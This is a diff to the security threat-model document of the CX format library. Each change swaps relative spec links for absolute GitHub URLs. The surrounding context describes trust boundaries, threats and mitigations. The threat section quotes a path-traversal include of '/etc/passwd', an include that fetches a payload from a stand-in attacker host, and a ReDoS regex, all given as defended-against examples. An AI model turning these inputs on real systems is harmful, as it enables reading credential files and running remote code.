@@ -51,7 +51,7 @@ CX participates in three trust boundaries. Hardening at one does not automatical
 
 1. **Input parser boundary.** Bytes from an external source enter the CX parser via `cx_to_data_bin` / `cx_to_data_bin_with_len`, the `cx_*_to_ast_bin` family (`cx_xml_to_ast_bin`, `cx_json_to_ast_bin`, `cx_yaml_to_ast_bin`, `cx_toml_to_ast_bin`, `cx_md_to_ast_bin`, plus the symmetric `cx_ast_bin_to_*` emitters), `cx_events_open` / `cx_events_open_fd` for the streaming surface, the CLI entry points (`cx parse`, `cx eval`, `cx fmt`, `cx canonical`, `cx hash`, `cx validate`), or any binding's `loads` / `parse` / `parse_xml` / `parse_json` / etc. The parser converts those bytes to in-process AST or data structures.
 2. **C ABI boundary.** Every binding crosses the FFI boundary into `libcx`. Inputs are passed as `(pointer, length)` byte buffers; outputs return as framed `[u32 LE size][payload]` buffers per [`../core/abi.md`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/abi.md).
-3. **Inclusion boundary.** When a CX document contains `[?cx include=PATH]`, the parser opens and parses an additional file. Path resolution is part of this boundary; semantics are normative in [`../core/code.md`](../core/code.md) §13.
+3. **Inclusion boundary.** When a CX document contains `[?cx include=PATH]`, the parser opens and parses an additional file. Path resolution is part of this boundary; semantics are normative in [`../core/code.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/core/code.md) §13.
 
 ## 4 — Threat actors and scenarios
 
@@ -71,7 +71,7 @@ Crafted input or a binding API invocation that triggers an out-of-bounds read or
 
 An attacker crafts `[?cx include=../../../etc/passwd]` or `[?cx include=https://evil.example/payload.cx]` to cause the parser to read a file or URL the operator did not intend.
 
-**Mitigation:** include resolution is **path-only** (no URL fetching), refuses absolute paths, refuses paths that escape the include root, and enforces a depth cap. Error codes are enumerated in [`../core/code.md`](../core/code.md) §13. Consumers of `libcx` set the include-search-root via the C ABI before parsing.
+**Mitigation:** include resolution is **path-only** (no URL fetching), refuses absolute paths, refuses paths that escape the include root, and enforces a depth cap. Error codes are enumerated in [`../core/code.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/core/code.md) §13. Consumers of `libcx` set the include-search-root via the C ABI before parsing.
 
 ### T4 — Type-confusion across conversion
 
@@ -105,7 +105,7 @@ An attacker uses the events streaming API (`cx_events_open` / `next` / `close`) 
 
 ### T9 — ReDoS via regex functions
 
-The `cx-stdlib/re` module ([`../stdlib/re.md`](../stdlib/re.md)) — `re:matches`, `re:find`, `re:find-all`, `re:replace`, `re:replace-first`, `re:replace-fn`, `re:split` — plus the schema `[pattern …]` constraint ([`../core/schema.md`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/schema.md) §7.1, rule `S008`) accept caller-supplied regex patterns. PCRE/Perl-style engines run for minutes on catastrophic-backtracking patterns such as `(a+)+$`.
+The `cx-stdlib/re` module ([`../stdlib/re.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/stdlib/re.md)) — `re:matches`, `re:find`, `re:find-all`, `re:replace`, `re:replace-first`, `re:replace-fn`, `re:split` — plus the schema `[pattern …]` constraint ([`../core/schema.md`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/schema.md) §7.1, rule `S008`) accept caller-supplied regex patterns. PCRE/Perl-style engines run for minutes on catastrophic-backtracking patterns such as `(a+)+$`.
 
 **Mitigation:** all regex call sites route through the vendored RE2 engine inside `libcx`. Matching is **linear-time in the input length** with no exposure to backtracking explosion. The same engine backs `cx-stdlib/re` and the schema `[pattern …]` constraint, so cross-binding regex-flavour drift is also eliminated.
 
@@ -159,22 +159,22 @@ Defenses present at the V core and inherited by every binding, each testable thr
 
 | defense | mechanism | reference |
 |---|---|---|
-| Recursion limit | configurable depth cap (default 64), enforced at parse and AST traversal | [`../core/code.md`](../core/code.md) |
-| Element / attribute count caps | configurable per-document and per-element | [`../core/code.md`](../core/code.md) |
+| Recursion limit | configurable depth cap (default 64), enforced at parse and AST traversal | [`../core/code.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/core/code.md) |
+| Element / attribute count caps | configurable per-document and per-element | [`../core/code.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/core/code.md) |
 | Payload-size cap | per-allocation budget on binary decoders | [`../core/data-bin.md`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/data-bin.md) |
 | Varint validation | overlong / truncated varints rejected | [`../core/data-bin.md`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/data-bin.md) |
 | External-entity rejection | DOCTYPE parsed but inert; no entity expansion | [`../core/grammar.ebnf`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/formal/grammar.ebnf) |
 | XXE / billion-laughs immunity | follows from external-entity rejection | (by-construction) |
-| Include-resolution scoping | path-only, caller-supplied root, depth cap, absolute-path refusal | [`../core/code.md`](../core/code.md) §13 |
+| Include-resolution scoping | path-only, caller-supplied root, depth cap, absolute-path refusal | [`../core/code.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/core/code.md) §13 |
 | UTF-8 validation | invalid UTF-8 in any input is an error | [`../core/abi.md`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/abi.md) |
 | Bounds-checked deserialization | every binding's CXCol / AST decoder validates length prefixes before allocation | [`../core/abi.md`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/abi.md); [`governance.md`](governance.md) §1.2 |
 | Type-preservation across formats | CXCol v1 binary, no string-format round-trips on hot paths | [`../core/data-bin.md`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/data-bin.md) |
 | Canonical-form determinism | `cx canonical` byte-stable across runs and bindings | [`../core/canonical.md`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/canonical.md); [`governance.md`](governance.md) §2.3 |
-| Linear-time regex | all regex call sites route through the vendored RE2 shim | [`../stdlib/re.md`](../stdlib/re.md) |
-| Function-recursion budget | evaluator enforces configurable call-depth cap (default 256) | [`../core/code.md`](../core/code.md) |
-| Sequence-length budget | evaluator enforces configurable sequence-length cap (default 1,000,000) | [`../core/code.md`](../core/code.md) |
-| Strict xs: constructors | `xs:integer` / `xs:double` / `xs:decimal` / etc. raise on unparseable string inputs | [`../core/code.md`](../core/code.md) |
-| Capability-based sandboxing | deny-by-default capability set; no ambient authority; a program may only narrow its set, never widen it; denial raises `CXER0271` | [`../core/security.md`](../core/security.md) |
+| Linear-time regex | all regex call sites route through the vendored RE2 shim | [`../stdlib/re.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/stdlib/re.md) |
+| Function-recursion budget | evaluator enforces configurable call-depth cap (default 256) | [`../core/code.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/core/code.md) |
+| Sequence-length budget | evaluator enforces configurable sequence-length cap (default 1,000,000) | [`../core/code.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/core/code.md) |
+| Strict xs: constructors | `xs:integer` / `xs:double` / `xs:decimal` / etc. raise on unparseable string inputs | [`../core/code.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/core/code.md) |
+| Capability-based sandboxing | deny-by-default capability set; no ambient authority; a program may only narrow its set, never widen it; denial raises `CXER0271` | [`../core/security.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/core/security.md) |
 | Secret redaction | secret values redact at every serialization / log / error / debug boundary unless declassified (`secret-reveal`) | [`../core/cxdm.md`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/cxdm.md) §12 |
 
 ## 6 — Known unhardened areas
@@ -185,9 +185,9 @@ Defenses present at the V core and inherited by every binding, each testable thr
 | Reproducible `libcx` builds | partial (consumer SHA-256 verification ships; build determinism is roadmap) |
 | Signed release artifacts | absent (1.0 milestone) |
 | Streaming-write per-chunk timer | absent — caller responsibility (T12) |
-| BOM / line-ending policy | **defined** — UTF-8 mandatory; UTF-8 BOM tolerated on parse and never emitted; LF / CRLF / CR all tolerated on parse; canonical emit produces LF only (per [`../core/conversions.md §0.4`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/conversions.md), [`../core/canonical.md §2.2`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/canonical.md), and [`../core/code.md §3.1`](../core/code.md)) |
+| BOM / line-ending policy | **defined** — UTF-8 mandatory; UTF-8 BOM tolerated on parse and never emitted; LF / CRLF / CR all tolerated on parse; canonical emit produces LF only (per [`../core/conversions.md §0.4`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/conversions.md), [`../core/canonical.md §2.2`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/canonical.md), and [`../core/code.md §3.1`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/core/code.md)) |
 | Unicode normalization policy | **defined** — input bytes preserved; NFC applied only for duplicate-key comparison, never to stored strings (per [`../core/abi.md §1.7`](https://github.com/cx-home/cx-core-data/blob/main/spec/03-approved/core/abi.md)) |
-| Hard sandboxing for the evaluator | **defined by composition** — the purity classifier (`pure` modifier on `[?def]` per [`../core/code.md §12.2`](../core/code.md), enforced against the closed builtin-purity table at [`../core/code.md §6.5.x`](../core/code.md)) refuses any reach into impure surfaces; `cx:eval` runs adversary-controlled program fragments under the five-mitigation sandbox at [`../modules/cx.md §3`](../stdlib/cx.md) (impurity refusal, context-map isolation, library-set non-widening, recursion-depth cap, and shared T10/T11/T9 budgets — see §10 and §11 of this document). A process-level hard sandbox (cgroup / seccomp / ulimit) remains the caller's responsibility for adversary-controlled inputs. |
+| Hard sandboxing for the evaluator | **defined by composition** — the purity classifier (`pure` modifier on `[?def]` per [`../core/code.md §12.2`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/core/code.md), enforced against the closed builtin-purity table at [`../core/code.md §6.5.x`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/core/code.md)) refuses any reach into impure surfaces; `cx:eval` runs adversary-controlled program fragments under the five-mitigation sandbox at [`../modules/cx.md §3`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/stdlib/cx.md) (impurity refusal, context-map isolation, library-set non-widening, recursion-depth cap, and shared T10/T11/T9 budgets — see §10 and §11 of this document). A process-level hard sandbox (cgroup / seccomp / ulimit) remains the caller's responsibility for adversary-controlled inputs. |
 
 Each row is tracked in `ROADMAP.md` and moves to §5 as it closes.
 
@@ -220,7 +220,7 @@ If a report is unclear which side it falls on, file it; the maintainers will rou
 
 The evaluator C-ABI surface (`cx_code_eval`, `cx_code_eval_streaming`, and the per-binding wrappers) takes three caller-supplied inputs: a CX data document (the context), a CX code template (the program), and an output target (`text` / `cx` / `html`).
 
-`cx_code_eval` is **not** a sandbox between mutually distrusting parties. A template can read any node in the data document and emit any value derived from it. Capability separation is the caller's responsibility **unless a capability set is supplied** ([`../core/security.md`](../core/security.md)): with deny-by-default capabilities the runtime enforces separation at the effect point (a denied effect raises `CXER0271`), and `cx:eval` fragments run under a non-wideable subset of the caller's set.
+`cx_code_eval` is **not** a sandbox between mutually distrusting parties. A template can read any node in the data document and emit any value derived from it. Capability separation is the caller's responsibility **unless a capability set is supplied** ([`../core/security.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/core/security.md)): with deny-by-default capabilities the runtime enforces separation at the effect point (a denied effect raises `CXER0271`), and `cx:eval` fragments run under a non-wideable subset of the caller's set.
 
 **Data-untrusted posture.** The data document comes from an untrusted source; the template is operator-authored. Untrusted-data DoS scenarios (T1, T9–T11) are bounded by the documented hardening. Output sanitisation for the chosen target (auto-escape on `html`) is enforced.
 
@@ -230,7 +230,7 @@ The evaluator C-ABI surface (`cx_code_eval`, `cx_code_eval_streaming`, and the p
 
 ## 11 — Trust model for `cx:eval` (self-host)
 
-[`../modules/cx.md`](../stdlib/cx.md) §3 specifies the `cx:eval(source, context, options?)` self-host function — the homoiconic runtime callable that evaluates a CX source string at runtime against a context map. It is **categorically different** from §10's C-ABI entry: `cx_code_eval` runs an operator-authored template against caller data; `cx:eval` runs a string-supplied program that may itself be adversary-controlled.
+[`../modules/cx.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/stdlib/cx.md) §3 specifies the `cx:eval(source, context, options?)` self-host function — the homoiconic runtime callable that evaluates a CX source string at runtime against a context map. It is **categorically different** from §10's C-ABI entry: `cx_code_eval` runs an operator-authored template against caller data; `cx:eval` runs a string-supplied program that may itself be adversary-controlled.
 
 ### 11.1 — Untrusted-input sources
 
@@ -245,7 +245,7 @@ A `cx:eval` call is **out of scope** when its `source` argument is a static stri
 
 ### 11.2 — Mitigations
 
-[`../modules/cx.md`](../stdlib/cx.md) §3 specifies five mitigations; they map to threat vectors as follows.
+[`../modules/cx.md`](https://github.com/cx-home/cx-core-code/blob/main/spec/03-approved/stdlib/cx.md) §3 specifies five mitigations; they map to threat vectors as follows.
 
 | # | Mitigation | Defends against |
 |---|---|---|
